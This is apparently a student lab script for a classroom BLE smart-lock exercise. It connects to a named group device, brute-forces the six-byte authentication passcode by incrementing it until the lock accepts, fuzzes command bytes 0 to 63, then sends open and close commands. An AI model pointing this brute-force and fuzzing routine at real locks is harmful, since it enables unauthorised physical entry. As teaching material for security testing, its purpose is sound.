#!/usr/bin/env python3
import sys
import asyncio
from BLEClient import BLEClient
from UserInterface import ShowUserInterface

DEVICE_NAME = "Smart Lock [Group 11]" # <------ Modify here to match your group. Don't hijack other groups :-)
# Commands 
AUTH = [0x00]  # 7 Bytes
OPEN = [0x01]  # 1 Byte
CLOSE = [0x02]  # 1 Byte
PASSCODE = [0x01, 0x02, 0x03, 0x04, 0x05, 0x06]  # Correct PASSCODE
# PASSCODE = [0x01, 0x02, 0x03, 0x04, 0x05, 0x07] # Wrong PASSCODE


def add_one(passcode):
    if passcode[-1] == 6:
        passcode[-1] = 0
        if passcode[-2] == 6:
            passcode[-2] = 0
            if passcode[-3] == 6:
                passcode[-3] = 0
                if passcode[-4] == 6:
                    passcode[-4] = 0
                    if passcode[-5] == 6:
                        if passcode[-6] == 6:
                            print("[!] Disconnected!")
                            sys.exit(0)
                            return
                        else:
                            passcode[-6] += 1
                    else:
                        passcode[-5] += 1
                else:
                    passcode[-4] += 1
            else:
                passcode[-3] += 1
        else:
            passcode[-2] += 1
    else:
        passcode[-1] += 1

transitions = {
    ('Locked', 'Locked'): 0,
    ('Locked', 'Authenticating'): 0,
    ('Authenticating', 'Locked'): 0,
    ('Authenticating', 'Authenticating'): 0,
    ('Authenticating', 'Authenticated'): 0,
    ('Authenticated', 'Authenticated'): 0,
    ('Authenticated', 'Opening'): 0,
    ('Authenticated', 'Closing'): 0,
    ('Opening', 'Opening'): 0,
    ('Opening', 'Unlocked'): 0,
    ('Unlocked', 'Unlocked'): 0,
    ('Unlocked', 'Closing'): 0,
    ('Closing', 'Closing'): 0,
    ('Closing', 'Locked'): 0
}

# Modify this code ... to create your fuzzer
async def example_control_smartlock():
    # Use this code as template to create your fuzzer
    ble = BLEClient()
    ble.init_logs()  # Collect logs from Smart Lock (Serial Port)

    print(f'[1] Connecting to "{DEVICE_NAME}"...')
    await ble.connect(DEVICE_NAME)

    print("\n[2] Authenticating...")
    # PASSCODE = [1, 0, 0, 0, 0, 0]
    res = await ble.write_command(AUTH + PASSCODE)
    while res[0] != 0: 
        print(f"[X] Failure: Wrong Passcode: {AUTH + PASSCODE}")
        add_one(PASSCODE)
        res = await ble.write_command(AUTH + PASSCODE)

    print("[!] Authenticated!!!")
    await asyncio.sleep(2)

    for i in range(64):
        if i == 1 or i == 10 or i == 11:
            continue
        else:
            res = await ble.write_command([i])

    print("\n[3] Opening")
    res = await ble.write_command(OPEN)
    await asyncio.sleep(2)

    print("\n[4] Closing")
    res = await ble.write_command(CLOSE)
    await asyncio.sleep(2)

    print("\n[5] Disconnecting...")
    await ble.disconnect()

    print(f"\n[6] Logs from Smart Lock (Serial Port):\n{'-'*50}")
    lines = ble.read_logs()  # Return a list of all log lines.
    for line in lines:
        print(line)
    # print(lines[-1])

    sys.exit(0)


# Show User interface if command line contains --gui
if len(sys.argv) > 1 and sys.argv[1] == "--gui":
    ShowUserInterface()
else:
    # Ortherwise, run this example
    try:
        asyncio.run(example_control_smartlock())
    except KeyboardInterrupt:
        print("\nProgram Exited by User!")
